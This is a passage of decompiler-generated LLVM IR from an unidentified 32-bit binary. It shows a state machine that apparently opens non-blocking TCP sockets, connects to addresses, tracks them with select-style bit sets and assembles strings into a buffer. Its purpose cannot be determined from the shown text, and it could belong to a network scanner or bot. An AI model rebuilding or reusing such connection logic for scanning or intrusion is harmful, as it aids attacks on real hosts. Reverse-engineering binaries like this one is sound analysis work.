  store i1 %v10_804853f, i1* %zf.global-to-local, align 1
  br i1 %v10_804853f, label %dec_label_pc_8048700, label %dec_label_pc_8048547

dec_label_pc_8048547:                             ; preds = %dec_label_pc_804853f
  %v10_8048547 = icmp eq i8 %v3_80485a5, 6
  store i1 %v10_8048547, i1* %zf.global-to-local, align 1
  br i1 %v10_8048547, label %dec_label_pc_80493a7, label %dec_label_pc_804854f

dec_label_pc_804854f:                             ; preds = %dec_label_pc_8048547
  %v10_804854f = icmp eq i8 %v3_80485a5, 7
  store i1 %v10_804854f, i1* %zf.global-to-local, align 1
  br i1 %v10_804854f, label %dec_label_pc_8049773, label %dec_label_pc_8048557

dec_label_pc_8048557:                             ; preds = %dec_label_pc_804854f
  %v10_8048557 = icmp eq i8 %v3_80485a5, 10
  store i1 %v10_8048557, i1* %zf.global-to-local, align 1
  br i1 %v10_8048557, label %dec_label_pc_8049829, label %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge

dec_label_pc_8048557.dec_label_pc_804855f_crit_edge: ; preds = %dec_label_pc_8048557
  %v0_804855f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804855f

dec_label_pc_804855f:                             ; preds = %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge, %dec_label_pc_8048c9d
  %v0_804855f = phi i32 [ %v0_804855f.pre, %dec_label_pc_8048557.dec_label_pc_804855f_crit_edge ], [ %v0_8048c9d, %dec_label_pc_8048c9d ]
  %v9_804855f = icmp eq i32 %v0_804855f, 12
  store i1 %v9_804855f, i1* %zf.global-to-local, align 1
  %v1_8048562 = add i32 %v0_80485a5, -1440
  %v2_8048562 = inttoptr i32 %v1_8048562 to i32*
  %v3_8048562 = load i32, i32* %v2_8048562, align 4
  store i32 %v3_8048562, i32* %edx.global-to-local, align 4
  store i8 0, i8* %v2_80485a5, align 1
  %v0_804856f = load i32, i32* %edx.global-to-local, align 4
  %v1_804856f = load i32, i32* @esp, align 4
  %v2_804856f = add i32 %v1_804856f, -4
  %v3_804856f = inttoptr i32 %v2_804856f to i32*
  store i32 %v0_804856f, i32* %v3_804856f, align 4
  %v1_8048570 = call i32 @function_8051a81(i32 %stack_var_-20924.0.ph)
  store i32 %v1_8048570, i32* %eax.global-to-local, align 4
  %v0_8048575 = load i32, i32* @esi, align 4
  %v1_8048575 = add i32 %v0_8048575, -1440
  %v2_8048575 = inttoptr i32 %v1_8048575 to i32*
  store i32 -1, i32* %v2_8048575, align 4
  %v0_804857f = load i32, i32* @esp, align 4
  %v6_804857f = icmp eq i32 %v0_804857f, -16
  store i1 %v6_804857f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048582

dec_label_pc_8048582:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_8048601, %dec_label_pc_804861f, %dec_label_pc_80493a7, %dec_label_pc_80486e4, %dec_label_pc_804855f
  %v0_8048582 = load i32, i32* @esp, align 4
  %v1_8048582 = add i32 %v0_8048582, 100
  %v2_8048582 = inttoptr i32 %v1_8048582 to i32*
  %v3_8048582 = load i32, i32* %v2_8048582, align 4
  %v0_8048586 = load i32, i32* @ebp, align 4
  %v1_8048586 = add i32 %v0_8048586, 3140
  store i32 %v1_8048586, i32* @ebp, align 4
  %v1_804858c = add i32 %v3_8048582, 1
  store i32 %v1_804858c, i32* %eax.global-to-local, align 4
  %v0_804858d = load i32, i32* @esi, align 4
  %v1_804858d = add i32 %v0_804858d, 3140
  store i32 %v1_804858d, i32* @esi, align 4
  store i32 %v1_804858c, i32* %v2_8048582, align 4
  %v0_8048597 = load i32, i32* @esp, align 4
  %v1_8048597 = add i32 %v0_8048597, 100
  %v2_8048597 = inttoptr i32 %v1_8048597 to i32*
  %v3_8048597 = load i32, i32* %v2_8048597, align 4
  store i32 %v3_8048597, i32* @ecx, align 4
  %v1_804859b = add i32 %v0_8048597, 112
  %v2_804859b = inttoptr i32 %v1_804859b to i32*
  %v3_804859b = load i32, i32* %v2_804859b, align 4
  %v15_804859b = icmp eq i32 %v3_804859b, %v3_8048597
  store i1 %v15_804859b, i1* %zf.global-to-local, align 1
  br i1 %v15_804859b, label %dec_label_pc_8048cdd, label %dec_label_pc_80485a5

dec_label_pc_80485a5:                             ; preds = %dec_label_pc_8048582, %dec_label_pc_8048517
  %v0_80485a5 = load i32, i32* @esi, align 4
  %v1_80485a5 = add i32 %v0_80485a5, -1436
  %v2_80485a5 = inttoptr i32 %v1_80485a5 to i8*
  %v3_80485a5 = load i8, i8* %v2_80485a5, align 1
  %v4_80485a5 = zext i8 %v3_80485a5 to i32
  %v5_80485a5 = load i32, i32* %eax.global-to-local, align 4
  %v6_80485a5 = and i32 %v5_80485a5, -256
  %v7_80485a5 = or i32 %v6_80485a5, %v4_80485a5
  store i32 %v7_80485a5, i32* %eax.global-to-local, align 4
  %v0_80485ab = load i32, i32* @ebp, align 4
  %v1_80485ab = add i32 %v0_80485ab, -16
  store i32 %v1_80485ab, i32* @edi, align 4
  %v6_80485ae = icmp eq i8 %v3_80485a5, 0
  %v10_80485ae = icmp eq i8 %v3_80485a5, 1
  store i1 %v10_80485ae, i1* %zf.global-to-local, align 1
  br i1 %v10_80485ae, label %dec_label_pc_80486ee, label %dec_label_pc_80485b6

dec_label_pc_80485b6:                             ; preds = %dec_label_pc_80485a5
  store i1 %v6_80485ae, i1* %zf.global-to-local, align 1
  %v1_80485b8 = icmp eq i1 %v6_80485ae, false
  br i1 %v1_80485b8, label %dec_label_pc_8048537, label %dec_label_pc_80485be

dec_label_pc_80485be:                             ; preds = %dec_label_pc_80485b6, %dec_label_pc_8048c91
  %v0_80485be = load i32, i32* @esp, align 4
  %v1_80485be = add i32 %v0_80485be, 20868
  %v2_80485be = inttoptr i32 %v1_80485be to i32*
  store i32 0, i32* %v2_80485be, align 4
  %v0_80485c9 = load i32, i32* @esp, align 4
  %v1_80485c9 = add i32 %v0_80485c9, 20872
  %v2_80485c9 = inttoptr i32 %v1_80485c9 to i32*
  store i32 0, i32* %v2_80485c9, align 4
  %v0_80485d4 = load i32, i32* @esp, align 4
  %v1_80485d4 = add i32 %v0_80485d4, 20876
  %v2_80485d4 = inttoptr i32 %v1_80485d4 to i32*
  store i32 0, i32* %v2_80485d4, align 4
  %v0_80485df = load i32, i32* @esp, align 4
  %v1_80485df = add i32 %v0_80485df, 20880
  %v2_80485df = inttoptr i32 %v1_80485df to i32*
  store i32 0, i32* %v2_80485df, align 4
  %v0_80485ea = load i32, i32* @esi, align 4
  %v1_80485ea = add i32 %v0_80485ea, -1440
  %v2_80485ea = inttoptr i32 %v1_80485ea to i32*
  %v3_80485ea = load i32, i32* %v2_80485ea, align 4
  store i32 %v3_80485ea, i32* %eax.global-to-local, align 4
  %v10_80485f0 = icmp eq i32 %v3_80485ea, -1
  store i1 %v10_80485f0, i1* %zf.global-to-local, align 1
  %v1_8048601.pre = load i32, i32* @esp, align 4
  br i1 %v10_80485f0, label %dec_label_pc_8048601, label %dec_label_pc_80485f5

dec_label_pc_80485f5:                             ; preds = %dec_label_pc_80485be
  %v9_80485f5 = icmp eq i32 %v1_8048601.pre, 12
  store i1 %v9_80485f5, i1* %zf.global-to-local, align 1
  %v2_80485f8 = add i32 %v1_8048601.pre, -16
  %v3_80485f8 = inttoptr i32 %v2_80485f8 to i32*
  store i32 %v3_80485ea, i32* %v3_80485f8, align 4
  %v1_80485f9 = call i32 @function_8051a81(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80485f9, i32* %eax.global-to-local, align 4
  %v0_80485fe = load i32, i32* @esp, align 4
  %v1_80485fe = add i32 %v0_80485fe, 16
  %v6_80485fe = icmp eq i32 %v1_80485fe, 0
  store i1 %v6_80485fe, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048601

dec_label_pc_8048601:                             ; preds = %dec_label_pc_80485be, %dec_label_pc_80485f5
  %v1_8048601 = phi i32 [ %v1_80485fe, %dec_label_pc_80485f5 ], [ %v1_8048601.pre, %dec_label_pc_80485be ]
  %v0_8048601 = load i32, i32* @ecx, align 4
  %v2_8048601 = add i32 %v1_8048601, -4
  %v3_8048601 = inttoptr i32 %v2_8048601 to i32*
  store i32 %v0_8048601, i32* %v3_8048601, align 4
  %v1_8048602 = add i32 %v1_8048601, -8
  %v2_8048602 = inttoptr i32 %v1_8048602 to i32*
  store i32 0, i32* %v2_8048602, align 4
  %v1_8048604 = add i32 %v1_8048601, -12
  %v2_8048604 = inttoptr i32 %v1_8048604 to i32*
  store i32 1, i32* %v2_8048604, align 4
  %v1_8048606 = add i32 %v1_8048601, -16
  %v2_8048606 = inttoptr i32 %v1_8048606 to i32*
  store i32 2, i32* %v2_8048606, align 4
  %v3_8048608 = call i32 @function_8052275(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048608, i32* %eax.global-to-local, align 4
  %v1_8048610 = load i32, i32* @esi, align 4
  %v2_8048610 = add i32 %v1_8048610, -1440
  %v3_8048610 = inttoptr i32 %v2_8048610 to i32*
  store i32 %v3_8048608, i32* %v3_8048610, align 4
  %v10_8048616 = icmp eq i32 %v3_8048608, -1
  store i1 %v10_8048616, i1* %zf.global-to-local, align 1
  br i1 %v10_8048616, label %dec_label_pc_8048582, label %dec_label_pc_804861f

dec_label_pc_804861f:                             ; preds = %dec_label_pc_8048601
  %v0_804861f = load i32, i32* @edx, align 4
  %v1_804861f = load i32, i32* @esp, align 4
  %v2_804861f = add i32 %v1_804861f, -4
  %v3_804861f = inttoptr i32 %v2_804861f to i32*
  store i32 %v0_804861f, i32* %v3_804861f, align 4
  %v1_8048620 = add i32 %v1_804861f, -8
  %v2_8048620 = inttoptr i32 %v1_8048620 to i32*
  store i32 0, i32* %v2_8048620, align 4
  %v1_8048622 = add i32 %v1_804861f, -12
  %v2_8048622 = inttoptr i32 %v1_8048622 to i32*
  store i32 3, i32* %v2_8048622, align 4
  %v2_8048624 = add i32 %v1_804861f, -16
  %v3_8048624 = inttoptr i32 %v2_8048624 to i32*
  store i32 %v3_8048608, i32* %v3_8048624, align 4
  %v3_8048625 = call i32 @function_80519bd(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804862a = load i32, i32* @esp, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v12_804862d = or i32 %v3_8048625, 2048
  store i32 %v12_804862d, i32* %eax.global-to-local, align 4
  %v2_8048630 = add i32 %v0_804862a, 8
  %v3_8048630 = inttoptr i32 %v2_8048630 to i32*
  store i32 %v12_804862d, i32* %v3_8048630, align 4
  %v1_8048631 = add i32 %v0_804862a, 4
  %v2_8048631 = inttoptr i32 %v1_8048631 to i32*
  store i32 4, i32* %v2_8048631, align 4
  %v0_8048633 = load i32, i32* @esi, align 4
  %v1_8048633 = add i32 %v0_8048633, -1440
  %v2_8048633 = inttoptr i32 %v1_8048633 to i32*
  %v3_8048633 = load i32, i32* %v2_8048633, align 4
  store i32 %v3_8048633, i32* %eax.global-to-local, align 4
  %v3_8048639 = inttoptr i32 %v0_804862a to i32*
  store i32 %v3_8048633, i32* %v3_8048639, align 4
  %v3_804863a = call i32 @function_80519bd(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804863f = load i32, i32* @esp, align 4
  %v1_804863f = add i32 %v0_804863f, 20916
  store i32 %v1_804863f, i32* %eax.global-to-local, align 4
  %v2_8048646 = inttoptr i32 %v1_804863f to i32*
  store i32 65535, i32* %v2_8048646, align 4
  %v0_8048651 = load i32, i32* @esp, align 4
  %v1_8048651 = inttoptr i32 %v0_8048651 to i32*
  store i32 4, i32* %v1_8048651, align 4
  %v0_8048658 = load i32, i32* %eax.global-to-local, align 4
  %v1_8048658 = load i32, i32* @esp, align 4
  %v2_8048658 = add i32 %v1_8048658, -4
  %v3_8048658 = inttoptr i32 %v2_8048658 to i32*
  store i32 %v0_8048658, i32* %v3_8048658, align 4
  %v1_8048659 = add i32 %v1_8048658, -8
  %v2_8048659 = inttoptr i32 %v1_8048659 to i32*
  store i32 8, i32* %v2_8048659, align 4
  %v1_804865b = add i32 %v1_8048658, -12
  %v2_804865b = inttoptr i32 %v1_804865b to i32*
  store i32 0, i32* %v2_804865b, align 4
  %v0_804865d = load i32, i32* @esi, align 4
  %v1_804865d = add i32 %v0_804865d, -1440
  %v2_804865d = inttoptr i32 %v1_804865d to i32*
  %v3_804865d = load i32, i32* %v2_804865d, align 4
  store i32 %v3_804865d, i32* %eax.global-to-local, align 4
  %v2_8048663 = add i32 %v1_8048658, -16
  %v3_8048663 = inttoptr i32 %v2_8048663 to i32*
  store i32 %v3_804865d, i32* %v3_8048663, align 4
  %v5_8048664 = call i32 @function_805223a(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8048664, i32* %eax.global-to-local, align 4
  %v0_8048669 = load i32, i32* @esi, align 4
  %v1_8048669 = add i32 %v0_8048669, -1424
  %v2_8048669 = inttoptr i32 %v1_8048669 to i32*
  %v3_8048669 = load i32, i32* %v2_8048669, align 4
  store i32 %v3_8048669, i32* %eax.global-to-local, align 4
  %v0_804866f = load i32, i32* @esp, align 4
  %v1_804866f = add i32 %v0_804866f, 112
  %v2_804866f = inttoptr i32 %v1_804866f to i32*
  %v3_804866f = load i32, i32* %v2_804866f, align 4
  store i32 %v3_804866f, i32* %edx.global-to-local, align 4
  %v2_8048673 = add i32 %v0_804866f, 20904
  %v3_8048673 = inttoptr i32 %v2_8048673 to i32*
  store i32 %v3_8048669, i32* %v3_8048673, align 4
  %v0_804867a = load i32, i32* @esp, align 4
  %v1_804867a = add i32 %v0_804867a, 20900
  %v2_804867a = inttoptr i32 %v1_804867a to i16*
  store i16 2, i16* %v2_804867a, align 2
  %v0_8048684 = load i32, i32* @esp, align 4
  %v1_8048684 = add i32 %v0_8048684, 102
  %v2_8048684 = inttoptr i32 %v1_8048684 to i16*
  %v3_8048684 = load i16, i16* %v2_8048684, align 2
  %v5_8048684 = load i32, i32* %eax.global-to-local, align 4
  %v6_8048684 = and i32 %v5_8048684, -65536
  %v0_8048689 = load i32, i32* %edx.global-to-local, align 4
  %v1_8048689 = load i32, i32* @esi, align 4
  %v2_8048689 = add i32 %v1_8048689, -1432
  %v3_8048689 = inttoptr i32 %v2_8048689 to i32*
  store i32 %v0_8048689, i32* %v3_8048689, align 4
  %v2_804868f = call i16 @llvm.bswap.i16(i16 %v3_8048684)
  %v3_804868f = zext i16 %v2_804868f to i32
  %v6_804868f = or i32 %v3_804868f, %v6_8048684
  store i32 %v6_804868f, i32* %eax.global-to-local, align 4
  %v2_8048693 = load i32, i32* @esp, align 4
  %v3_8048693 = add i32 %v2_8048693, 20902
  %v4_8048693 = inttoptr i32 %v3_8048693 to i16*
  store i16 %v2_804868f, i16* %v4_8048693, align 2
  %v0_804869b = load i32, i32* @esp, align 4
  %v9_804869b = icmp eq i32 %v0_804869b, -28
  store i1 %v9_804869b, i1* %zf.global-to-local, align 1
  %v0_804869e = load i32, i32* @esi, align 4
  %v1_804869e = add i32 %v0_804869e, -1436
  %v2_804869e = inttoptr i32 %v1_804869e to i8*
  store i8 2, i8* %v2_804869e, align 1
  %v0_80486a5 = load i32, i32* @esp, align 4
  %v1_80486a5 = add i32 %v0_80486a5, -4
  %v2_80486a5 = inttoptr i32 %v1_80486a5 to i32*
  store i32 16, i32* %v2_80486a5, align 4
  %v1_80486a7 = add i32 %v0_80486a5, 20872
  store i32 %v1_80486a7, i32* %ecx.global-to-local, align 4
  %v2_80486ae = add i32 %v0_80486a5, -8
  %v3_80486ae = inttoptr i32 %v2_80486ae to i32*
  store i32 %v1_80486a7, i32* %v3_80486ae, align 4
  %v0_80486af = load i32, i32* @esi, align 4
  %v1_80486af = add i32 %v0_80486af, -1440
  %v2_80486af = inttoptr i32 %v1_80486af to i32*
  %v3_80486af = load i32, i32* %v2_80486af, align 4
  store i32 %v3_80486af, i32* @edi, align 4
  %v2_80486b5 = add i32 %v0_80486a5, -12
  %v3_80486b5 = inttoptr i32 %v2_80486b5 to i32*
  store i32 %v3_80486af, i32* %v3_80486b5, align 4
  %v3_80486b6 = call i32 @function_805209a(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esi, align 4
  %v1_80486bb = add i32 %v0_80486bb, -1440
  %v2_80486bb = inttoptr i32 %v1_80486bb to i32*
  %v3_80486bb = load i32, i32* %v2_80486bb, align 4
  %v1_80486c3 = urem i32 %v3_80486bb, 32
  store i32 %v1_80486c3, i32* %eax.global-to-local, align 4
  %v2_80486c6 = udiv i32 %v3_80486bb, 32
  store i32 %v2_80486c6, i32* %edx.global-to-local, align 4
  %v0_80486c9 = load i32, i32* @esp, align 4
  %v2_80486c9 = mul nuw nsw i32 %v2_80486c6, 4
  %v3_80486c9 = add nuw nsw i32 %v2_80486c9, 20628
  %v4_80486c9 = add i32 %v3_80486c9, %v0_80486c9
  %v5_80486c9 = inttoptr i32 %v4_80486c9 to i32*
  %v6_80486c9 = load i32, i32* %v5_80486c9, align 4
  %v9_80486c9 = shl i32 1, %v1_80486c3
  %v12_80486c9 = or i32 %v6_80486c9, %v9_80486c9
  store i32 %v12_80486c9, i32* %v5_80486c9, align 4
  %v0_80486d1 = load i32, i32* @esp, align 4
  %v1_80486d1 = add i32 %v0_80486d1, 16
  %v0_80486d4 = load i32, i32* @esi, align 4
  %v1_80486d4 = add i32 %v0_80486d4, -1440
  %v2_80486d4 = inttoptr i32 %v1_80486d4 to i32*
  %v3_80486d4 = load i32, i32* %v2_80486d4, align 4
  store i32 %v3_80486d4, i32* %eax.global-to-local, align 4
  %v1_80486da = add i32 %v0_80486d1, 88
  %v2_80486da = inttoptr i32 %v1_80486da to i32*
  %v3_80486da = load i32, i32* %v2_80486da, align 4
  %v5_80486da = sub i32 %v3_80486da, %v3_80486d4
  %v11_80486da = xor i32 %v3_80486da, %v3_80486d4
  %v12_80486da = xor i32 %v5_80486da, %v3_80486da
  %v13_80486da = and i32 %v12_80486da, %v11_80486da
  %v14_80486da = icmp slt i32 %v13_80486da, 0
  %v15_80486da = icmp eq i32 %v5_80486da, 0
  store i1 %v15_80486da, i1* %zf.global-to-local, align 1
  %v16_80486da = icmp slt i32 %v5_80486da, 0
  %v2_80486de = icmp eq i1 %v16_80486da, %v14_80486da
  br i1 %v2_80486de, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80486e4:                             ; preds = %dec_label_pc_8049829, %dec_label_pc_8049773, %dec_label_pc_80493a7, %dec_label_pc_8048cb2, %dec_label_pc_8048c28, %dec_label_pc_804861f
  %v1_80486e5 = phi i32 [ %v1_8049845, %dec_label_pc_8049829 ], [ %v1_804978f, %dec_label_pc_8049773 ], [ %v1_80493c3, %dec_label_pc_80493a7 ], [ %v0_8048cce, %dec_label_pc_8048cb2 ], [ %v1_8048c79, %dec_label_pc_8048c28 ], [ %v1_80486d1, %dec_label_pc_804861f ]
  %v0_80486e4 = phi i32 [ %v3_804983f, %dec_label_pc_8049829 ], [ %v3_8049789, %dec_label_pc_8049773 ], [ %v3_80493bd, %dec_label_pc_80493a7 ], [ %v3_8048cc8, %dec_label_pc_8048cb2 ], [ %v3_8048c7c, %dec_label_pc_8048c28 ], [ %v3_80486d4, %dec_label_pc_804861f ]
  %v1_80486e4 = add i32 %v0_80486e4, 1
  %v8_80486e4 = icmp eq i32 %v1_80486e4, 0
  store i1 %v8_80486e4, i1* %zf.global-to-local, align 1
  store i32 %v1_80486e4, i32* %eax.global-to-local, align 4
  %v2_80486e5 = add i32 %v1_80486e5, 72
  %v3_80486e5 = inttoptr i32 %v2_80486e5 to i32*
  store i32 %v1_80486e4, i32* %v3_80486e5, align 4
  br label %dec_label_pc_8048582

dec_label_pc_80486ee:                             ; preds = %dec_label_pc_80485a5
  %v1_80486ee = add i32 %v0_80485a5, 16
  %v2_80486ee = inttoptr i32 %v1_80486ee to i32*
  %v3_80486ee = load i32, i32* %v2_80486ee, align 4
  store i32 %v3_80486ee, i32* @ebx, align 4
  %v1_80486f1 = icmp eq i32 %v3_80486ee, 0
  store i1 %v1_80486f1, i1* %zf.global-to-local, align 1
  br i1 %v1_80486f1, label %dec_label_pc_8048c91, label %dec_label_pc_80486f9

dec_label_pc_80486f9:                             ; preds = %dec_label_pc_80486ee
  store i8 4, i8* %v2_80485a5, align 1
  %v0_8048700.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8048700

dec_label_pc_8048700:                             ; preds = %dec_label_pc_804853f, %dec_label_pc_80486f9
  %v0_8048700 = phi i32 [ %v0_80485a5, %dec_label_pc_804853f ], [ %v0_8048700.pre, %dec_label_pc_80486f9 ]
  %v1_8048700 = add i32 %v0_8048700, 24
  %v2_8048700 = inttoptr i32 %v1_8048700 to i32*
  store i32 -1, i32* %v2_8048700, align 4
  %v0_8048707 = load i32, i32* @esi, align 4
  %v1_8048707 = add i32 %v0_8048707, 12
  %v2_8048707 = inttoptr i32 %v1_8048707 to i32*
  store i32 0, i32* %v2_8048707, align 4
  %v0_804870e = load i32, i32* @edi, align 4
  %v1_804870e = add i32 %v0_804870e, 2116
  store i32 %v1_804870e, i32* @eax, align 4
  %v0_8048714 = load i32, i32* @ecx, align 4
  %v1_8048714 = load i32, i32* @esp, align 4
  %v2_8048714 = add i32 %v1_8048714, -4
  %v3_8048714 = inttoptr i32 %v2_8048714 to i32*
  store i32 %v0_8048714, i32* %v3_8048714, align 4
  %v0_8048715 = load i32, i32* @ecx, align 4
  %v2_8048715 = add i32 %v1_8048714, -8
  %v3_8048715 = inttoptr i32 %v2_8048715 to i32*
  store i32 %v0_8048715, i32* %v3_8048715, align 4
  %v1_8048716 = add i32 %v1_8048714, -12
  %v2_8048716 = inttoptr i32 %v1_8048716 to i32*
  store i32 1024, i32* %v2_8048716, align 4
  %v0_804871b = load i32, i32* @eax, align 4
  %v2_804871b = add i32 %v1_8048714, -16
  %v3_804871b = inttoptr i32 %v2_804871b to i32*
  store i32 %v0_804871b, i32* %v3_804871b, align 4
  %v2_804871c = call i32 @function_8051570(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804871c, i32* %eax.global-to-local, align 4
  %v0_8048721 = load i32, i32* @esi, align 4
  %v1_8048721 = add i32 %v0_8048721, 672
  %v2_8048721 = inttoptr i32 %v1_8048721 to i32*
  store i32 0, i32* %v2_8048721, align 4
  %v0_804872b = load i32, i32* @esp, align 4
  %v1_804872b = inttoptr i32 %v0_804872b to i32*
  %v2_804872b = load i32, i32* %v1_804872b, align 4
  store i32 %v2_804872b, i32* %eax.global-to-local, align 4
  %v3_804872b = add i32 %v0_804872b, 4
  %v1_804872c = inttoptr i32 %v3_804872b to i32*
  %v2_804872c = load i32, i32* %v1_804872c, align 4
  store i32 %v2_804872c, i32* %edx.global-to-local, align 4
  store i32 10240, i32* %v1_804872c, align 4
  %v1_8048732 = add i32 %v0_804872b, 10388
  store i32 %v1_8048732, i32* @eax, align 4
  store i32 %v1_8048732, i32* %v1_804872b, align 4
  %v2_804873a = call i32 @function_8051570(i32 %stack_var_-20924.0.ph, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804873a, i32* %eax.global-to-local, align 4
  %v0_804873f = load i32, i32* @edi, align 4
  %v1_804873f = add i32 %v0_804873f, 1431
  store i32 %v1_804873f, i32* %edx.global-to-local, align 4
  %v1_8048745 = load i32, i32* @esp, align 4
  %v2_8048745 = add i32 %v1_8048745, 112
  %v3_8048745 = inttoptr i32 %v2_8048745 to i32*
  store i32 %v1_804873f, i32* %v3_8048745, align 4
  %v0_8048749 = load i32, i32* @esp, align 4
  %v1_8048749 = inttoptr i32 %v0_8048749 to i32*
  %v2_8048749 = load i32, i32* %v1_8048749, align 4
  store i32 %v2_8048749, i32* %eax.global-to-local, align 4
  %v1_804874a = add i32 %v0_8048749, 10388
  store i32 %v1_804874a, i32* %ecx.global-to-local, align 4
  store i32 %v1_804874a, i32* %v1_8048749, align 4
  %v2_8048752 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048752, i32* %eax.global-to-local, align 4
  %v0_8048757 = load i32, i32* @esp, align 4
  %v1_8048757 = inttoptr i32 %v0_8048757 to i32*
  %v2_8048757 = load i32, i32* %v1_8048757, align 4
  store i32 %v2_8048757, i32* %ecx.global-to-local, align 4
  %v3_8048757 = add i32 %v0_8048757, 4
  %v1_8048758 = inttoptr i32 %v3_8048757 to i32*
  %v2_8048758 = load i32, i32* %v1_8048758, align 4
  store i32 %v2_8048758, i32* @ebx, align 4
  %v1_8048759 = add i32 %v0_8048757, 112
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  %v3_8048759 = load i32, i32* %v2_8048759, align 4
  store i32 %v3_8048759, i32* %v1_8048758, align 4
  %v1_804875e = add i32 %v0_8048757, 10388
  store i32 %v1_804875e, i32* %edx.global-to-local, align 4
  %v2_8048765 = add i32 %v1_804875e, %v2_8048752
  store i32 %v2_8048765, i32* %eax.global-to-local, align 4
  store i32 %v2_8048765, i32* %v1_8048757, align 4
  %v3_8048769 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048769, i32* %eax.global-to-local, align 4
  %v0_804876e = load i32, i32* @esp, align 4
  %v1_804876e = inttoptr i32 %v0_804876e to i32*
  %v2_804876e = load i32, i32* %v1_804876e, align 4
  store i32 %v2_804876e, i32* @ebx, align 4
  %v1_804876f = add i32 %v0_804876e, 10388
  store i32 %v1_804876f, i32* %ecx.global-to-local, align 4
  store i32 %v1_804876f, i32* %v1_804876e, align 4
  %v2_8048777 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_8048777, i32* %eax.global-to-local, align 4
  %v0_804877c = load i32, i32* @esp, align 4
  %v1_804877c = inttoptr i32 %v0_804877c to i32*
  %v2_804877c = load i32, i32* %v1_804877c, align 4
  store i32 %v2_804877c, i32* %edx.global-to-local, align 4
  %v3_804877c = add i32 %v0_804877c, 4
  %v1_804877d = inttoptr i32 %v3_804877c to i32*
  %v2_804877d = load i32, i32* %v1_804877d, align 4
  store i32 %v2_804877d, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805439f.7 to i32), i32* %v1_804877d, align 4
  %v1_8048783 = add i32 %v0_804877c, 10388
  store i32 %v1_8048783, i32* %edx.global-to-local, align 4
  %v2_804878a = add i32 %v1_8048783, %v2_8048777
  store i32 %v2_804878a, i32* %eax.global-to-local, align 4
  store i32 %v2_804878a, i32* %v1_804877c, align 4
  %v3_804878e = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804878e, i32* %eax.global-to-local, align 4
  %v0_8048793 = load i32, i32* @esp, align 4
  %v1_8048793 = inttoptr i32 %v0_8048793 to i32*
  %v2_8048793 = load i32, i32* %v1_8048793, align 4
  store i32 %v2_8048793, i32* @ebx, align 4
  %v1_8048794 = add i32 %v0_8048793, 10388
  store i32 %v1_8048794, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048794, i32* %v1_8048793, align 4
  %v2_804879c = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_804879c, i32* %eax.global-to-local, align 4
  %v0_80487a1 = load i32, i32* @esp, align 4
  %v1_80487a1 = inttoptr i32 %v0_80487a1 to i32*
  %v3_80487a1 = add i32 %v0_80487a1, 4
  %v0_80487a2 = load i32, i32* @edi, align 4
  %v1_80487a2 = add i32 %v0_80487a2, 532
  store i32 %v1_80487a2, i32* %edx.global-to-local, align 4
  %v1_80487a8 = inttoptr i32 %v3_80487a1 to i32*
  %v2_80487a8 = load i32, i32* %v1_80487a8, align 4
  store i32 %v2_80487a8, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487a2, i32* %v1_80487a8, align 4
  %v1_80487aa = add i32 %v0_80487a1, 10388
  store i32 %v1_80487aa, i32* %edx.global-to-local, align 4
  %v2_80487b1 = add i32 %v1_80487aa, %v2_804879c
  store i32 %v2_80487b1, i32* %eax.global-to-local, align 4
  store i32 %v2_80487b1, i32* %v1_80487a1, align 4
  %v3_80487b5 = call i32 @function_8051500(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487b5, i32* %eax.global-to-local, align 4
  %v0_80487ba = load i32, i32* @esp, align 4
  %v1_80487ba = inttoptr i32 %v0_80487ba to i32*
  %v2_80487ba = load i32, i32* %v1_80487ba, align 4
  store i32 %v2_80487ba, i32* @ebx, align 4
  %v1_80487bb = add i32 %v0_80487ba, 10388
  store i32 %v1_80487bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487bb, i32* %v1_80487ba, align 4
  %v2_80487c3 = call i32 @function_80514e0(i8* %v1_8048752)
  store i32 %v2_80487c3, i32* %eax.global-to-local, align 4
  %v0_80487c8 = load i32, i32* @esp, align 4
  %v1_80487c8 = inttoptr i32 %v0_80487c8 to i32*
  %v2_80487c8 = load i32, i32* %v1_80487c8, align 4
  store i32 %v2_80487c8, i32* %edx.global-to-local, align 4
  %v3_80487c8 = add i32 %v0_80487c8, 4
  %v1_80487c9 = inttoptr i32 %v3_80487c8 to i32*
  %v2_80487c9 = load i32, i32* %v1_80487c9, align 4
  store i32 %v2_80487c9, i32* %ecx.global-to-local, align 4
